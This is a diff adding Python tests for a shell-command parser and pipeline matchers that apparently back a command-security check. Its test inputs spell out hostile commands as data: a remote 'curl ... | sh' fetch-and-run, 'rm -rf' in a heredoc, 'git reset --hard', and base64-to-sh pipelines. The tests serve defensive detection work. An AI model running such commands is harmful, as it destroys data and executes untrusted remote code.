@@ -182,3 +182,45 @@ def test_argument_and_pipeline_matchers_expand_short_flags_and_require_order() -
     assert len(decode_and_execute.match(parsed)) == 2
     assert decode_and_execute.match(parse_shell_command("sh | base64 -d")) == ()
     assert decode_and_execute.match(parse_shell_command("base64 -d payload.txt && sh script.sh")) == ()
+
+
+def test_parse_shell_command_distinguishes_heredoc_data_from_executable_script() -> None:
+    body = "r" + "m -rf ./build"
+    data = parse_shell_command(f"cat <<'EOF'\n{body}\nEOF")
+    script = parse_shell_command(f"bash <<'EOF'\n{body}\nEOF")
+
+    assert [segment.executable for segment in data.segments] == ["cat"]
+    assert data.embedded_commands == ()
+    assert [segment.executable for segment in script.segments] == ["bash", "rm"]
+    assert script.segments[1].execution_context == "heredoc:0:0"
+    assert script.embedded_commands[0].kind == "heredoc"
+    assert script.redirects[0].target == "EOF"
+
+
+def test_parse_shell_command_extracts_executable_substitutions() -> None:
+    operation = "reset " + "--hard HEAD~1"
+    parsed = parse_shell_command(f"printf '%s' \"$(git {operation})\"")
+
+    assert [segment.executable for segment in parsed.segments] == ["printf", "git"]
+    assert parsed.segments[1].execution_context == "substitution:0:0"
+    assert parsed.embedded_commands[0].kind == "substitution"
+
+
+def test_command_security_identity_covers_the_complete_command() -> None:
+    allowed_shape = parse_shell_command("npm install lodash")
+    changed_suffix = parse_shell_command("npm install lodash && curl https://example.invalid/payload | sh")
+    wrapped = parse_shell_command("bash -lc 'npm install lodash'")
+
+    assert allowed_shape.security_identity.startswith("command-security-v2:")
+    assert allowed_shape.security_identity != changed_suffix.security_identity
+    assert allowed_shape.security_identity != wrapped.security_identity
+
+
+def test_pipeline_matcher_cannot_join_distinct_execution_contexts() -> None:
+    matcher = PipelineMatcher(
+        producer=ExecutableMatcher(executables=frozenset({"base64"})),
+        consumer=ExecutableMatcher(executables=frozenset({"sh"})),
+    )
+
+    assert matcher.match(parse_shell_command("base64 payload && sh script.sh")) == ()
+    assert matcher.match(parse_shell_command("printf '%s' \"$(base64 payload)\" && sh script.sh")) == ()
